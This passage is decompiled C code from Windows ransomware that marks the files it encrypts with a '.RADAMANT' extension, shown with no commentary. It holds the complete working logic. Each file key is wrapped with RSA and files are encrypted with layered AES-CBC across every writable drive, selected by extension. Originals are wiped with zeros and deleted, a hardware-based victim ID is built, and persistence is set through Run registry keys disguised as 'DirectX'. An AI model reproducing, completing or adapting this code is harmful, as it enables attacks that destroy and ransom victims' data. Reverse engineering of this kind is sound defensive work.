  for (local_928 = 0; local_928 < 0x21; local_928 = local_928 + 1) {
    local_2ec[local_92c] = *(BYTE *)((int)&local_1bc + local_928);
    local_92c = local_92c + 1;
  }
  for (local_928 = 0; local_928 < 0x21; local_928 = local_928 + 1) {
    local_2ec[local_92c] = *(BYTE *)((int)&local_cc + local_928);
    local_92c = local_92c + 1;
  }
  for (local_928 = 0; local_928 < 0x21; local_928 = local_928 + 1) {
    local_2ec[local_92c] = *(BYTE *)((int)&local_fc + local_928);
    local_92c = local_92c + 1;
  }
  for (local_928 = 0; local_928 < 0x21; local_928 = local_928 + 1) {
    local_2ec[local_92c] = *(BYTE *)((int)&local_12c + local_928);
    local_92c = local_92c + 1;
  }
  _printf("%s\n%s\n\n",&local_15c,&local_cc);
  _printf("%s\n%s\n\n",&local_18c,&local_fc);
  _printf("%s\n%s\n\n",&local_1bc,&local_12c);
  _aes_set_key(local_4fc,(int)&local_15c,0x100);
  _aes_set_key(local_70c,(int)&local_18c,0x100);
  _aes_set_key(local_91c,(int)&local_1bc,0x100);
  local_930 = _fopen(param_1,"rb");
  local_934 = _fopen(param_2,"wb");
  local_938 = 200;
  __Z11encrypt_RSAPhmPcPm(param_3,param_4,local_2ec,&local_938);
  _fwrite(local_2ec,1,local_938,local_934);
  _DstBuf = (byte *)_malloc(0x10b);
  _Memory = (byte *)_malloc(0x101);
  for (local_928 = 0; local_928 < (int)local_924; local_928 = local_928 + 1) {
    pbVar3 = _DstBuf + local_928;
    iVar2 = _rand();
    *pbVar3 = (char)iVar2 + (char)(iVar2 / 100) * -100 + 0x1e;
    pbVar3 = _Memory + local_928;
    iVar2 = _rand();
    *pbVar3 = (char)iVar2 + (char)(iVar2 / 100) * -100 + 0x1e;
  }
  local_938 = _fread(_DstBuf,1,0xf0,local_930);
  __Z11encrypt_RSAPhmPcPm(param_3,param_4,_DstBuf,&local_938);
  _fwrite(_DstBuf,1,local_938,local_934);
  local_920 = _fread(_DstBuf,1,local_924,local_930);
  cVar1 = '\0';
  while (local_920 == local_924) {
    for (local_92c = 0; local_92c < 0x21; local_92c = local_92c + 1) {
      *(char *)((int)&local_3c + local_92c) =
           (*(char *)((int)&local_cc + local_92c) + cVar1) * cVar1;
    }
    _aes_cbc_encrypt(local_4fc,&local_3c,(int)_DstBuf,_Memory,local_920);
    for (local_92c = 0; local_92c < 0x21; local_92c = local_92c + 1) {
      *(char *)((int)&local_6c + local_92c) =
           (*(char *)((int)&local_fc + local_92c) + cVar1) * cVar1;
    }
    _aes_cbc_encrypt(local_70c,&local_6c,(int)_Memory,_DstBuf,local_920);
    for (local_92c = 0; local_92c < 0x21; local_92c = local_92c + 1) {
      *(char *)((int)&local_9c + local_92c) =
           (*(char *)((int)&local_12c + local_92c) + cVar1) * cVar1;
    }
    _aes_cbc_encrypt(local_91c,&local_9c,(int)_DstBuf,_Memory,local_920);
    _fwrite(_Memory,1,local_920,local_934);
    local_920 = _fread(_DstBuf,1,local_924,local_930);
    cVar1 = cVar1 + '\x01';
  }
  if (local_920 != 0) {
    _fwrite(_DstBuf,1,local_920,local_934);
  }
  _fclose(local_930);
  _fclose(local_934);
  _free(_DstBuf);
  _free(_Memory);
  return 0;
}



undefined4 __cdecl __Z11decryptFilePcS_Phm(char *param_1,char *param_2,BYTE *param_3,DWORD param_4)

{
  BYTE *pBVar1;
  char cVar2;
  int local_944;
  size_t local_940;
  FILE *local_93c;
  FILE *local_938;
  byte *local_934;
  byte *local_930;
  int local_92c;
  int local_928;
  size_t local_924;
  size_t local_920;
  uint local_91c [132];
  uint local_70c [132];
  uint local_4fc [132];
  BYTE local_2ec [304];
  undefined4 local_1bc;
  undefined4 local_1b8;
  undefined4 local_1b4;
  undefined4 local_1b0;
  undefined4 local_1ac;
  undefined4 local_1a8;
  undefined4 local_1a4;
  undefined4 local_1a0;
  undefined local_19c;
  undefined4 local_18c;
  undefined4 local_188;
  undefined4 local_184;
  undefined4 local_180;
  undefined4 local_17c;
  undefined4 local_178;
  undefined4 local_174;
  undefined4 local_170;
  undefined local_16c;
  undefined4 local_15c;
  undefined4 local_158;
  undefined4 local_154;
  undefined4 local_150;
  undefined4 local_14c;
  undefined4 local_148;
  undefined4 local_144;
  undefined4 local_140;
  undefined local_13c;
  undefined4 local_12c;
  undefined4 local_128;
  undefined4 local_124;
  undefined4 local_120;
  undefined4 local_11c;
  undefined4 local_118;
  undefined4 local_114;
  undefined4 local_110;
  undefined local_10c;
  undefined4 local_fc;
  undefined4 local_f8;
  undefined4 local_f4;
  undefined4 local_f0;
  undefined4 local_ec;
  undefined4 local_e8;
  undefined4 local_e4;
  undefined4 local_e0;
  undefined local_dc;
  undefined4 local_cc;
  undefined4 local_c8;
  undefined4 local_c4;
  undefined4 local_c0;
  undefined4 local_bc;
  undefined4 local_b8;
  undefined4 local_b4;
  undefined4 local_b0;
  undefined local_ac;
  undefined4 local_9c;
  undefined4 local_98;
  undefined4 local_94;
  undefined4 local_90;
  undefined4 local_8c;
  undefined4 local_88;
  undefined4 local_84;
  undefined4 local_80;
  undefined local_7c;
  undefined4 local_6c;
  undefined4 local_68;
  undefined4 local_64;
  undefined4 local_60;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined local_4c;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined local_1c;
  
  local_3c = 0x34333236;
  local_38 = 0x38373635;
  local_34 = 0x32313039;
  local_30 = 0x36353433;
  local_2c = 0x30393837;
  local_28 = 0x34333231;
  local_24 = 0x38373635;
  local_20 = 0x32313039;
  local_1c = 0;
  local_6c = 0x34333236;
  local_68 = 0x38373635;
  local_64 = 0x32313039;
  local_60 = 0x36353433;
  local_5c = 0x30393837;
  local_58 = 0x34333231;
  local_54 = 0x38373635;
  local_50 = 0x32313039;
  local_4c = 0;
  local_9c = 0x34333236;
  local_98 = 0x38373635;
  local_94 = 0x32313039;
  local_90 = 0x36353433;
  local_8c = 0x30393837;
  local_88 = 0x34333231;
  local_84 = 0x38373635;
  local_80 = 0x32313039;
  local_7c = 0;
  local_cc = 0x34333231;
  local_c8 = 0x38373635;
  local_c4 = 0x32313039;
  local_c0 = 0x36353433;
  local_bc = 0x30393837;
  local_b8 = 0x34333231;
  local_b4 = 0x38373635;
  local_b0 = 0x32313039;
  local_ac = 0;
  local_fc = 0x34333232;
  local_f8 = 0x38373635;
  local_f4 = 0x32313039;
  local_f0 = 0x36353433;
  local_ec = 0x30393837;
  local_e8 = 0x34333231;
  local_e4 = 0x38373635;
  local_e0 = 0x32313039;
  local_dc = 0;
  local_12c = 0x34333233;
  local_128 = 0x38373635;
  local_124 = 0x32313039;
  local_120 = 0x36353433;
  local_11c = 0x30393837;
  local_118 = 0x34333231;
  local_114 = 0x38373635;
  local_110 = 0x32313039;
  local_10c = 0;
  local_15c = 0x34333234;
  local_158 = 0x38373635;
  local_154 = 0x32313039;
  local_150 = 0x36353433;
  local_14c = 0x30393837;
  local_148 = 0x34333231;
  local_144 = 0x38373635;
  local_140 = 0x32313039;
  local_13c = 0;
  local_18c = 0x34333235;
  local_188 = 0x38373635;
  local_184 = 0x32313039;
  local_180 = 0x36353433;
  local_17c = 0x30393837;
  local_178 = 0x34333231;
  local_174 = 0x38373635;
  local_170 = 0x32313039;
  local_16c = 0;
  local_1bc = 0x34333236;
  local_1b8 = 0x38373635;
  local_1b4 = 0x32313039;
  local_1b0 = 0x36353433;
  local_1ac = 0x30393837;
  local_1a8 = 0x34333231;
  local_1a4 = 0x38373635;
  local_1a0 = 0x32313039;
  local_19c = 0;
  local_924 = 0x10;
  local_930 = (byte *)_malloc(0x10);
  local_934 = (byte *)_malloc(local_924);
  local_938 = _fopen(param_1,"rb");
  local_93c = _fopen(param_2,"wb");
  _fseek(local_938,0,2);
  _fseek(local_938,0,0);
  local_940 = _fread(local_2ec,1,0x100,local_938);
  __Z11decrypt_RSAPhmPcPm(param_3,param_4,local_2ec,&local_940);
  local_92c = 0;
  _printf("\n\nDDDDD\n\n");
  for (local_928 = 0; local_928 < 0x21; local_928 = local_928 + 1) {
    pBVar1 = local_2ec + local_92c;
    local_92c = local_92c + 1;
    *(BYTE *)((int)&local_15c + local_928) = *pBVar1;
  }
  for (local_928 = 0; local_928 < 0x21; local_928 = local_928 + 1) {
    pBVar1 = local_2ec + local_92c;
    local_92c = local_92c + 1;
    *(BYTE *)((int)&local_18c + local_928) = *pBVar1;
  }
  for (local_928 = 0; local_928 < 0x21; local_928 = local_928 + 1) {
    pBVar1 = local_2ec + local_92c;
    local_92c = local_92c + 1;
    *(BYTE *)((int)&local_1bc + local_928) = *pBVar1;
  }
  for (local_928 = 0; local_928 < 0x21; local_928 = local_928 + 1) {
    pBVar1 = local_2ec + local_92c;
    local_92c = local_92c + 1;
    *(BYTE *)((int)&local_cc + local_928) = *pBVar1;
  }
  for (local_928 = 0; local_928 < 0x21; local_928 = local_928 + 1) {
    pBVar1 = local_2ec + local_92c;
    local_92c = local_92c + 1;
    *(BYTE *)((int)&local_fc + local_928) = *pBVar1;
  }
  for (local_928 = 0; local_928 < 0x21; local_928 = local_928 + 1) {
    pBVar1 = local_2ec + local_92c;
    local_92c = local_92c + 1;
    *(BYTE *)((int)&local_12c + local_928) = *pBVar1;
  }
  _printf("%s\n%s\n\n",&local_15c,&local_cc);
  _printf("%s\n%s\n\n",&local_18c,&local_fc);
  _printf("%s\n%s\n\n",&local_1bc,&local_12c);
  _aes_set_key(local_4fc,(int)&local_15c,0x100);
  _aes_set_key(local_70c,(int)&local_18c,0x100);
  _aes_set_key(local_91c,(int)&local_1bc,0x100);
  for (local_944 = 0; local_944 < (int)local_924; local_944 = local_944 + 1) {
    local_930[local_944] = 0;
    local_934[local_944] = 0;
  }
  local_940 = _fread(local_2ec,1,0x100,local_938);
  __Z11decrypt_RSAPhmPcPm(param_3,param_4,local_2ec,&local_940);
  _fwrite(local_2ec,1,local_940,local_93c);
  local_920 = _fread(local_930,1,local_924,local_938);
  cVar2 = '\0';
  while (local_920 == local_924) {
    for (local_92c = 0; local_92c < 0x21; local_92c = local_92c + 1) {
      *(char *)((int)&local_9c + local_92c) =
           (*(char *)((int)&local_12c + local_92c) + cVar2) * cVar2;
    }
    _aes_cbc_decrypt((int)local_91c,&local_9c,local_930,local_934,local_920);
    for (local_92c = 0; local_92c < 0x21; local_92c = local_92c + 1) {
      *(char *)((int)&local_6c + local_92c) =
           (*(char *)((int)&local_fc + local_92c) + cVar2) * cVar2;
    }
    _aes_cbc_decrypt((int)local_70c,&local_6c,local_934,local_930,local_920);
    for (local_92c = 0; local_92c < 0x21; local_92c = local_92c + 1) {
      *(char *)((int)&local_3c + local_92c) =
           (*(char *)((int)&local_cc + local_92c) + cVar2) * cVar2;
    }
    _aes_cbc_decrypt((int)local_4fc,&local_3c,local_930,local_934,local_920);
    _fwrite(local_934,1,local_920,local_93c);
    local_920 = _fread(local_930,1,local_924,local_938);
    cVar2 = cVar2 + '\x01';
  }
  if (local_920 != 0) {
    _fwrite(local_930,1,local_920,local_93c);
  }
  _fclose(local_938);
  _fclose(local_93c);
  _free(local_930);
  _free(local_934);
  return 0;
}



undefined4 __cdecl __Z9my_strcmpPcS_(char *param_1,char *param_2)

{
  size_t sVar1;
  size_t sVar2;
  undefined4 local_234;
  uint local_230;
  char local_22c [272];
  char local_11c [276];
  
  sVar1 = _strlen(param_1);
  sVar2 = _strlen(param_2);
  if (sVar1 == sVar2) {
    _sprintf(local_11c,"%s",param_1);
    _sprintf(local_22c,"%s",param_2);
    for (local_230 = 0; sVar1 = _strlen(local_11c), local_230 < sVar1; local_230 = local_230 + 1) {
      if (('@' < local_11c[local_230]) && (local_11c[local_230] < '[')) {
        local_11c[local_230] = local_11c[local_230] + ' ';
      }
      if (('@' < local_22c[local_230]) && (local_22c[local_230] < '[')) {
        local_22c[local_230] = local_22c[local_230] + ' ';
      }
      if (local_11c[local_230] != local_22c[local_230]) {
        return 0;
      }
    }
    local_234 = 1;
  }
  else {
    local_234 = 0;
  }
  return local_234;
}



undefined4 __cdecl __Z9checkMaskPc(char *param_1)

{
  size_t sVar1;
  char *pcVar2;
  int iVar3;
  char local_5c [68];
  int local_18;
  uint local_14;
  char *local_10;
  
  sVar1 = _strlen(param_1);
  local_10 = (char *)_malloc(sVar1 + 1);
  for (local_14 = _strlen(param_1); (0 < (int)local_14 && (param_1[local_14] != '.'));
      local_14 = local_14 - 1) {
  }
  if (local_14 != 0) {
    local_18 = 0;
    while( true ) {
      local_14 = local_14 + 1;
      sVar1 = _strlen(param_1);
      if (sVar1 <= local_14) break;
      local_10[local_18] = param_1[local_14];
      local_18 = local_18 + 1;
    }
    local_10[local_18] = '\0';
    local_14 = 3;
    local_18 = 0;
    while (sVar1 = _strlen(&_exts), local_14 < sVar1 + 1) {
      local_5c[local_18] = (&_exts)[local_14];
      if (((&_exts)[local_14] == ' ') || (iVar3 = local_18 + 1, (&_exts)[local_14] == ']')) {
        pcVar2 = local_5c + local_18;
        local_18 = local_18 + 1;
        *pcVar2 = '\0';
        iVar3 = __Z9my_strcmpPcS_(local_10,local_5c);
        if (iVar3 != 0) {
          return 1;
        }
        local_18 = 0;
        iVar3 = local_18;
      }
      local_18 = iVar3;
      local_14 = local_14 + 1;
    }
    _free(local_10);
  }
  return 0;
}



bool __cdecl __Z17checkMaskRADAMANTPc(char *param_1)

{
  size_t sVar1;
  char *_Str1;
  int iVar2;
  int local_10;
  uint local_c;
  
  sVar1 = _strlen(param_1);
  _Str1 = (char *)_malloc(sVar1 + 1);
  for (local_c = _strlen(param_1); (0 < (int)local_c && (param_1[local_c] != '.'));
      local_c = local_c - 1) {
  }
  local_10 = 0;
  for (; sVar1 = _strlen(param_1), local_c < sVar1; local_c = local_c + 1) {
    _Str1[local_10] = param_1[local_c];
    local_10 = local_10 + 1;
  }
  _Str1[local_10] = '\0';
  iVar2 = _strcmp(_Str1,".RADAMANT");
  if (iVar2 != 0) {
    _free(_Str1);
  }
  return iVar2 == 0;
}



void __cdecl __Z14encryptFileAESPcS_Phm(char *param_1,char *param_2,BYTE *param_3,DWORD param_4)

{
  size_t sVar1;
  size_t sVar2;
  size_t unaff_EBX;
  undefined local_102c [4112];
  long local_1c;
  FILE *local_18;
  char *local_14;
  char *local_10;
  undefined4 uStack12;
  
  uStack12 = 0x402fb0;
  __alloca(unaff_EBX);
  uStack12 = 0x402fbb;
  sVar1 = _strlen(param_1);
  uStack12 = 0x402fc8;
  sVar2 = _strlen(param_2);
  uStack12 = 0x402fd6;
  local_10 = (char *)_malloc(sVar1 + sVar2 + 5);
  uStack12 = 0x402fe4;
  sVar1 = _strlen(param_1);
  uStack12 = 0x402ff1;
  sVar2 = _strlen(param_2);
  uStack12 = 0x402fff;
  local_14 = (char *)_malloc(sVar1 + sVar2 + 5);
  uStack12 = 0x403023;
  _sprintf(local_10,"%s%s");
  uStack12 = 0x403044;
  _sprintf(local_14,"%s%s.RADAMANT");
  uStack12 = 0x403064;
  __Z11encryptFilePcS_Phm(local_10,local_14,param_3,param_4);
  uStack12 = 0x403077;
  _SetFileAttributesA_8(local_10,0x80);
  uStack12 = 0x40308d;
  local_18 = _fopen(local_10,"rb");
  uStack12 = 0x4030ab;
  _fseek(local_18,0,2);
  uStack12 = 0x4030b6;
  local_1c = _ftell(local_18);
  uStack12 = 0x4030c4;
  _fclose(local_18);
  uStack12 = 0x4030e3;
  _memset(local_102c,0,0x1000);
  uStack12 = 0x4030f6;
  local_18 = _fopen(local_10,"wb");
  while (0 < local_1c) {
    uStack12 = 0x403124;
    _fwrite(local_102c,1,0x1000,local_18);
    local_1c = -0x1000;
  }
  uStack12 = 0x403138;
  _fclose(local_18);
  uStack12 = 0x403143;
  _remove(local_10);
  uStack12 = 0x40314e;
  _free(local_10);
  uStack12 = 0x403159;
  _free(local_14);
  return;
}



void __cdecl __Z14decryptFileAESPcS_Phm(char *param_1,char *param_2,BYTE *param_3,DWORD param_4)

{
  size_t sVar1;
  size_t sVar2;
  char *_Dest;
  char *_Dest_00;
  
  sVar1 = _strlen(param_1);
  sVar2 = _strlen(param_2);
  _Dest = (char *)_malloc(sVar1 + sVar2 + 5);
  sVar1 = _strlen(param_1);
  sVar2 = _strlen(param_2);
  _Dest_00 = (char *)_malloc(sVar1 + sVar2 + 5);
  _sprintf(_Dest,"%s%s",param_1,param_2);
  _sprintf(_Dest_00,"%s%s",param_1,param_2);
  sVar1 = _strlen(_Dest_00);
  _Dest_00[sVar1 - 4] = '\0';
  __Z11decryptFilePcS_Phm(_Dest,_Dest_00,param_3,param_4);
  _remove(_Dest);
  _free(_Dest);
  _free(_Dest_00);
  return;
}



HANDLE __cdecl __Z11try_to_editPcS_(undefined4 param_1,undefined4 param_2)

{
  HANDLE hObject;
  _OFSTRUCT local_48c;
  char local_3fc [1016];
  
  _sprintf(local_3fc,"%s%s",param_1,param_2);
  hObject = (HANDLE)_OpenFile_12(local_3fc,&local_48c,2);
  if (hObject != (HANDLE)0xffffffff) {
    _CloseHandle_4(hObject);
  }
  return hObject;
}



undefined4 __cdecl __Z6SearchPciPhm(char *param_1,int param_2,BYTE *param_3,DWORD param_4)

{
  bool bVar1;
  int iVar2;
  HANDLE pvVar3;
  BOOL BVar4;
  undefined3 extraout_var;
  undefined4 local_670;
  CHAR local_66c [272];
  char local_55c [1036];
  HANDLE local_150;
  _WIN32_FIND_DATAA local_14c;
  
  _GetWindowsDirectoryA_8(local_66c,0x104);
  _strcat(local_66c,"\\");
  _sprintf(local_55c,"%s*.*",param_1);
  local_150 = _FindFirstFileA_8(local_55c,&local_14c);
  if (local_150 == (HANDLE)0xffffffff) {
    local_670 = 0xffffffff;
  }
  else {
    if (param_2 == 0) {
      do {
        iVar2 = _strcmp(local_14c.cFileName,".");
        if ((iVar2 != 0) && (iVar2 = _strcmp(local_14c.cFileName,".."), iVar2 != 0)) {
          if ((local_14c.dwFileAttributes >> 4 & 1) == 0) {
            iVar2 = __Z9checkMaskPc(local_14c.cFileName);
            if ((iVar2 != 0) &&
               (pvVar3 = __Z11try_to_editPcS_(param_1,local_14c.cFileName),
               pvVar3 != (HANDLE)0xffffffff)) {
              __Z14encryptFileAESPcS_Phm(param_1,local_14c.cFileName,param_3,param_4);
            }
          }
          else {
            _sprintf(local_55c,"%s%s\\",param_1,local_14c.cFileName);
            iVar2 = __Z9my_strcmpPcS_(local_55c,local_66c);
            if (iVar2 == 0) {
              __Z6SearchPciPhm(local_55c,0,param_3,param_4);
            }
          }
        }
        BVar4 = _FindNextFileA_8(local_150,&local_14c);
      } while (BVar4 != 0);
    }
    else if (param_2 == 1) {
      do {
        iVar2 = _strcmp(local_14c.cFileName,".");
        if ((iVar2 != 0) && (iVar2 = _strcmp(local_14c.cFileName,".."), iVar2 != 0)) {
          if ((local_14c.dwFileAttributes >> 4 & 1) == 0) {
            bVar1 = __Z17checkMaskRADAMANTPc(local_14c.cFileName);
            if (CONCAT31(extraout_var,bVar1) != 0) {
              __Z14decryptFileAESPcS_Phm(param_1,local_14c.cFileName,param_3,param_4);
            }
          }
          else {
            _sprintf(local_55c,"%s%s\\",param_1,local_14c.cFileName);
            __Z6SearchPciPhm(local_55c,1,param_3,param_4);
          }
        }
        BVar4 = _FindNextFileA_8(local_150,&local_14c);
      } while (BVar4 != 0);
    }
    _FindClose_4(local_150);
  }
  return local_670;
}



undefined4 __cdecl __Z8GetCSizePcPi(undefined4 param_1,int *param_2)

{
  int iVar1;
  char *pcVar2;
  HANDLE hFile;
  DWORD DVar3;
  BOOL BVar4;
  undefined4 local_564;
  char local_55c [1036];
  HANDLE local_150;
  _WIN32_FIND_DATAA local_14c;
  
  _sprintf(local_55c,"%s*.*",param_1);
  local_150 = _FindFirstFileA_8(local_55c,&local_14c);
  if (local_150 == (HANDLE)0xffffffff) {
    local_564 = 0xffffffff;
  }
  else {
    do {
      iVar1 = _strcmp(local_14c.cFileName,".");
      if ((iVar1 != 0) && (iVar1 = _strcmp(local_14c.cFileName,".."), iVar1 != 0)) {
        if ((local_14c.dwFileAttributes >> 4 & 1) == 0) {
          pcVar2 = _strstr(local_14c.cFileName,".RADAMANT");
          if (pcVar2 != (char *)0x0) {
            _sprintf(local_55c,"%s%s",param_1,local_14c.cFileName);
            hFile = (HANDLE)__lopen_8(local_55c,0);
            DVar3 = _GetFileSize_8(hFile,(LPDWORD)0x0);
            *param_2 = DVar3 + *param_2;
            _CloseHandle_4(hFile);
          }
        }
        else {
          _sprintf(local_55c,"%s%s\\",param_1,local_14c.cFileName);
          __Z8GetCSizePcPi(local_55c,param_2);
        }
      }
      BVar4 = _FindNextFileA_8(local_150,&local_14c);
    } while (BVar4 != 0);
    _FindClose_4(local_150);
  }
  return local_564;
}



void __cdecl __Z20GetEncryptedFileSizePi(int *param_1)

{
  DWORD DVar1;
  int local_14;
  char local_c;
  undefined local_b;
  undefined local_a;
  undefined local_9;
  uint local_8;
  
  DVar1 = _GetLogicalDrives_0();
  for (local_14 = 0; local_14 < 0x1a; local_14 = local_14 + 1) {
    local_8 = DVar1 >> ((byte)local_14 & 0x1f) & 1;
    if (local_8 == 1) {
      local_c = (byte)local_14 + 0x41;
      local_b = 0x3a;
      local_a = 0x5c;
      local_9 = 0;
      __Z8GetCSizePcPi(&local_c,param_1);
    }
  }
  return;
}



bool __cdecl __Z26try_to_create_file_on_diskPc(undefined4 param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  bool bVar7;
  char local_4c [44];
  HANDLE local_20;
  
  iVar1 = _rand();
  iVar2 = _rand();
  iVar3 = _rand();
  iVar4 = _rand();
  iVar5 = _rand();
  iVar6 = _rand();
  _sprintf(local_4c,"%s%c%c%c%c%c%c",param_1,iVar6 % 0x19 + 0x61,iVar5 % 0x19 + 0x61,
           iVar4 % 0x19 + 0x61,iVar3 % 0x19 + 0x61,iVar2 % 0x19 + 0x61,iVar1 % 0x19 + 0x61);
  local_20 = _CreateFileA_28(local_4c,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
  bVar7 = local_20 != (HANDLE)0xffffffff;
  if (bVar7) {
    _CloseHandle_4(local_20);
    _remove(local_4c);
  }
  return bVar7;
}



void __cdecl __Z17FindAndCryprFilesPhm(BYTE *param_1,DWORD param_2)

{
  bool bVar1;
  DWORD DVar2;
  undefined3 extraout_var;
  int local_14;
  char local_c;
  undefined local_b;
  undefined local_a;
  undefined local_9;
  uint local_8;
  
  DVar2 = _GetLogicalDrives_0();
  for (local_14 = 0; local_14 < 0x1a; local_14 = local_14 + 1) {
    local_8 = DVar2 >> ((byte)local_14 & 0x1f) & 1;
    if (local_8 == 1) {
      local_c = (byte)local_14 + 0x41;
      local_b = 0x3a;
      local_a = 0x5c;
      local_9 = 0;
      bVar1 = __Z26try_to_create_file_on_diskPc(&local_c);
      if (CONCAT31(extraout_var,bVar1) != 0) {
        __Z6SearchPciPhm(&local_c,0,param_1,param_2);
      }
    }
  }
  return;
}



void __cdecl __Z19FindAndDecryprFilesPhm(BYTE *param_1,DWORD param_2)

{
  bool bVar1;
  DWORD DVar2;
  undefined3 extraout_var;
  int local_14;
  char local_c;
  undefined local_b;
  undefined local_a;
  undefined local_9;
  uint local_8;
  
  DVar2 = _GetLogicalDrives_0();
  for (local_14 = 0; local_14 < 0x1a; local_14 = local_14 + 1) {
    local_8 = DVar2 >> ((byte)local_14 & 0x1f) & 1;
    if (local_8 == 1) {
      local_c = (byte)local_14 + 0x41;
      local_b = 0x3a;
      local_a = 0x5c;
      local_9 = 0;
      bVar1 = __Z26try_to_create_file_on_diskPc(&local_c);
      if (CONCAT31(extraout_var,bVar1) != 0) {
        __Z6SearchPciPhm(&local_c,1,param_1,param_2);
      }
    }
  }
  return;
}



void __cdecl __Z6getMD5PcS_(int param_1,char *param_2)

{
  size_t sVar1;
  int iVar2;
  byte *pbVar3;
  int local_94;
  int local_90;
  byte local_8c [16];
  int local_7c [27];
  undefined4 local_10;
  
  local_10 = 0;
  __ZN3MD57MD5InitEP7MD5_CTX(0,local_7c);
  sVar1 = _strlen(param_2);
  __ZN3MD59MD5UpdateEP7MD5_CTXPhj(local_10,local_7c,(int)param_2,sVar1);
  local_8c[0] = 0;
  pbVar3 = local_8c;
  for (iVar2 = 0xf; pbVar3 = pbVar3 + 1, iVar2 != 0; iVar2 = iVar2 + -1) {
    *pbVar3 = 0;
  }
  __ZN3MD58MD5FinalEPhP7MD5_CTX(local_10,(int)local_8c,local_7c);
  local_90 = 0;
  for (local_94 = 0; local_94 < 0x10; local_94 = local_94 + 1) {
    _sprintf((char *)(local_90 + param_1),"%02x",(uint)local_8c[local_94]);
    local_90 = local_90 + 2;
  }
  return;
}



void __cdecl __Z8getDiscsPc(int param_1)

{
  bool bVar1;
  DWORD DVar2;
  undefined3 extraout_var;
  byte bVar3;
  int local_18;
  int local_10;
  char local_c;
  undefined local_b;
  undefined local_a;
  undefined local_9;
  uint local_8;
  
  local_10 = 0;
  DVar2 = _GetLogicalDrives_0();
  for (local_18 = 0; local_18 < 0x1a; local_18 = local_18 + 1) {
    bVar3 = (byte)local_18;
    local_8 = DVar2 >> (bVar3 & 0x1f) & 1;
    if (local_8 == 1) {
      local_c = bVar3 + 0x41;
      local_b = 0x3a;
      local_a = 0x5c;
      local_9 = 0;
      bVar1 = __Z26try_to_create_file_on_diskPc(&local_c);
      if (CONCAT31(extraout_var,bVar1) == 0) {
        *(byte *)(local_10 + param_1) = bVar3 + 0x61;
        local_10 = local_10 + 1;
      }
      else {
        *(byte *)(local_10 + param_1) = bVar3 + 0x41;
        local_10 = local_10 + 1;
      }
    }
  }
  *(undefined *)(param_1 + local_10) = 0;
  return;
}



void __cdecl __Z17getWindowsVersionPc(char *param_1)

{
  DWORD DVar1;
  uint local_14;
  
  local_14 = 0;
  DVar1 = _GetVersion_0();
  if (-1 < (int)DVar1) {
    local_14 = DVar1 >> 0x10;
  }
  _sprintf(param_1,"%d.%d.%d",DVar1 & 0xff,(DVar1 & 0xffff) >> 8,local_14);
  return;
}



void __cdecl __Z11GetProcBitsPc(LPSTR param_1)

{
  HMODULE hModule;
  HANDLE pvVar1;
  int local_c;
  FARPROC local_8;
  
  local_c = 0;
  hModule = _GetModuleHandleA_4("kernel32");
  local_8 = _GetProcAddress_8(hModule,"IsWow64Process");
  if (local_8 != (FARPROC)0x0) {
    pvVar1 = _GetCurrentProcess_0();
    (*local_8)(pvVar1,&local_c);
  }
  if (local_c == 0) {
    _wsprintfA(param_1,"32");
  }
  else if (local_c != 0) {
    _wsprintfA(param_1,"64");
  }
  return;
}



void __cdecl __Z5getIDPc(int param_1)

{
  int iVar1;
  int iVar2;
  char local_42c [32];
  tagHW_PROFILE_INFOA local_40c;
  char local_38c [256];
  _SYSTEM_INFO local_28c;
  DWORD local_250;
  CHAR local_24c [272];
  CHAR local_13c [272];
  CHAR local_2c [36];
  
  __Z11GetProcBitsPc(local_2c);
  _GetWindowsDirectoryA_8(local_13c,0x104);
  local_250 = 500;
  _GetComputerNameA_8(local_24c,&local_250);
  _GetSystemInfo_4(&local_28c);
  _sprintf(local_38c,"%s\n%s\n%s\n%d\n%d\n%d\n",local_2c,local_24c,local_13c,
           local_28c.dwNumberOfProcessors,local_28c.dwProcessorType,
           (uint)local_28c.wProcessorRevision);
  _GetCurrentHwProfileA_4(&local_40c);
  _sprintf(local_38c,"%s%s\n%s\n",local_38c,local_40c.szHwProfileGuid,local_40c.szHwProfileName);
  __Z17getWindowsVersionPc(local_42c);
  iVar1 = _GetKeyboardType_4(0);
  iVar2 = _GetKeyboardType_4(2);
  _sprintf(local_38c,"%s%s\n%i \n",local_38c,local_42c,iVar2 * iVar1);
  _printf("%s",local_38c);
  __Z6getMD5PcS_(param_1,local_38c);
  return;
}



void __Z7SetARunv(void)

{
  size_t sVar1;
  BYTE local_11c [268];
  HKEY local_10 [3];
  
  _GetModuleFileNameA_12((HMODULE)0x0,(LPSTR)local_11c,0x100);
  _RegCreateKeyExA_36((HKEY)0x80000002,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,"",0,2,
                      (LPSECURITY_ATTRIBUTES)0x0,local_10,(LPDWORD)0x0);
  sVar1 = _strlen((char *)local_11c);
  _RegSetValueExA_24(local_10[0],"DirectX",0,1,local_11c,sVar1);
  _RegCloseKey_4(local_10[0]);
  _RegCreateKeyExA_36((HKEY)0x80000001,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,"",0,2,
                      (LPSECURITY_ATTRIBUTES)0x0,local_10,(LPDWORD)0x0);
  sVar1 = _strlen((char *)local_11c);
  _RegSetValueExA_24(local_10[0],"DirectX",0,1,local_11c,sVar1);
  _RegCloseKey_4(local_10[0]);
  return;
}



void __Z7DelARunv(void)

{
  CHAR local_11c [268];
  HKEY local_10 [3];
  
  _GetModuleFileNameA_12((HMODULE)0x0,local_11c,0x100);
  _RegCreateKeyExA_36((HKEY)0x80000002,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,"",0,2,
                      (LPSECURITY_ATTRIBUTES)0x0,local_10,(LPDWORD)0x0);
  _RegDeleteValueA_8(local_10[0],"DirectX");
  _RegCloseKey_4(local_10[0]);
  _RegCreateKeyExA_36((HKEY)0x80000001,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,"",0,2,
                      (LPSECURITY_ATTRIBUTES)0x0,local_10,(LPDWORD)0x0);
  _RegDeleteValueA_8(local_10[0],"DirectX");
  _RegCloseKey_4(local_10[0]);
  return;
}



int __Z9checkARunv(void)

{
  DWORD local_120;
